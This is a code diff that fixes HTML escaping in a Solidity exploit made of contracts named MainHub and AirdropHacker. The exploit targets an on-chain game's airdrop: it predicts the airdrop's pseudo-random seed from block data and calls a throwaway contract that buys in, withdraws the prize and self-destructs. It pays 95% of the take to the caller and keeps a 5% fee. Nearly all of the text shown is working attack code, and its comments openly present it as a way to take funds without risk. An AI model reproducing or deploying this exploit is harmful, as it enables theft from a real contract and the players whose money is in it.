@@ -36,14 +36,14 @@ contract MainHub{
     }
     
     function attack() public onlyNotClosed{
-        require(code.airDropPot_()&gt;=.5 ether); //requires there is at least a pot of .5 ether otherwise not worth it.
+        require(code.airDropPot_()>=.5 ether); //requires there is at least a pot of .5 ether otherwise not worth it.
         require(airdrop());
         uint256 initialBalance = address(this).balance;
         (new AirdropHacker).value(.1 ether)();
         uint256 postBalance = address(this).balance;
         uint256 takenAmount = postBalance - initialBalance;
         msg.sender.transfer(takenAmount*95/100); //5% fee, you didnt risk anything anyway.
-        require(address(this).balance&gt;=.1 ether);//last sanity check (why the hell not?) if it reaches this you already won anyway
+        require(address(this).balance>=.1 ether);//last sanity check (why the hell not?) if it reaches this you already won anyway
     }
     
     function airdrop() private view returns(bool)
@@ -58,7 +58,7 @@ contract MainHub{
             (block.number)
             
         )));
-        if((seed - ((seed / 1000) * 1000)) &lt; code.airDropTracker_())//looks at thier airdrop tracking number
+        if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_())//looks at thier airdrop tracking number
             return(true);
         else
             return(false);
@@ -76,7 +76,7 @@ contract AirdropHacker{
     constructor() public payable{
         code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2);//just a random address
         code.withdraw();
-        require(address(this).balance&gt;=.1 ether);//would get 1/4 of airdrop, which appears to be on average .2 ether, this is just a sanity check
+        require(address(this).balance>=.1 ether);//would get 1/4 of airdrop, which appears to be on average .2 ether, this is just a sanity check
         selfdestruct(msg.sender);
     }
     
@@ -93,7 +93,7 @@ library SafeMath {
         pure
         returns (uint256) 
     {
-        require(b &lt;= a, &quot;SafeMath sub failed&quot;);
+        require(b <= a, "SafeMath sub failed");
         return a - b;
     }
 
@@ -106,7 +106,7 @@ library SafeMath {
         returns (uint256 c) 
     {
         c = a + b;
-        require(c &gt;= a, &quot;SafeMath add failed&quot;);
+        require(c >= a, "SafeMath add failed");
         return c;
     }
     
